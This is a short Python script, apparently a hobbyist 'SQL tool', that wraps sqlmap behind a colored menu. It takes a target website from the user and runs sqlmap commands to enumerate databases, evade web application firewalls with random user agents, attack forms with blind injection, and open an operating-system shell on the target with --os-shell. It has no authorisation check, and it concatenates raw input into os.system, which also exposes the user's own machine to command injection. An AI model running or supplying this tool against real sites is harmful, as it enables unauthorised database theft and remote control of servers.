from pip._vendor.colorama import Fore
import os
import subprocess
import time

os.system('cls')

banner = """

░██████╗░█████╗░██╗░░░░░██╗██╗░░██╗██╗░░░██╗██████╗░
██╔════╝██╔══██╗██║░░░░░██║██║░░██║██║░░░██║██╔══██╗
╚█████╗░███████║██║░░░░░██║███████║╚██╗░██╔╝██████╔╝
░╚═══██╗██╔══██║██║░░░░░██║██╔══██║░╚████╔╝░██╔══██╗
██████╔╝██║░░██║███████╗██║██║░░██║░░╚██╔╝░░██║░░██║
╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝
"""

print(Fore.BLUE+banner)

print(Fore.BLUE+'['+Fore.WHITE+'Salihvr sql tool -V2-'+Fore.BLUE+']')
print(Fore.BLUE+'['+Fore.WHITE+'Coded by Salihvr'+Fore.BLUE+']')
print()
print(Fore.BLUE+'['+Fore.WHITE+'1'+Fore.BLUE+'] '+Fore.WHITE+'Sql injection')
print(Fore.BLUE+'['+Fore.WHITE+'2'+Fore.BLUE+'] '+Fore.WHITE+'Sql injection with waf')
print(Fore.BLUE+'['+Fore.WHITE+'3'+Fore.BLUE+'] '+Fore.WHITE+'Blind Sql injection')
print(Fore.BLUE+'['+Fore.WHITE+'4'+Fore.BLUE+'] '+Fore.WHITE+'Sql Shell')
print(Fore.BLUE+'['+Fore.WHITE+'6'+Fore.BLUE+'] '+Fore.WHITE+'Post Sql injection')
print()

injection = input(Fore.BLUE+'['+Fore.WHITE+'Choose the Type'+Fore.BLUE+']'+Fore.WHITE+'#:')
print()

if injection == '1':
    target = input(Fore.BLUE+'['+Fore.WHITE+'Target Website'+Fore.BLUE+']'+Fore.WHITE+'#:')
    os.system('sqlmap -u '+target+' --dbs --batch')
if injection == '2':
    target2 = input(Fore.BLUE+'['+Fore.WHITE+'Target Website'+Fore.BLUE+']'+Fore.WHITE+'#:')
    os.system('sqlmap -u '+target2+' --dbs --random-agent --batch')
if injection == '3':
    target3 = input(Fore.BLUE+'['+Fore.WHITE+'Target Site'+Fore.BLUE+']'+Fore.WHITE+'#:')
    os.system('sqlmap -u '+target3+' --dbs --random-agent --form --no-cast --batch')
if injection == '4':
    target4 = input(Fore.BLUE+'['+Fore.WHITE+'Target Site'+Fore.BLUE+']'+Fore.WHITE+'#:')
    os.system('sqlmap -u '+target4+' --random-agent --no-cast --os-shell --batch')
if injection == '5':
    target5 = input(Fore.BLUE+'['+Fore.WHITE+'Txt Name'+Fore.BLUE+']'+Fore.WHITE+'#:')
    os.system('sqlmap -r '+target5+' --dbs --random-agent --no-cast --batch')

print()
print(Fore.GREEN+'coded by '+Fore.WHITE+': Salihvr')
print(Fore.GREEN+'Discord '+Fore.WHITE+': Salihvr$#0531')
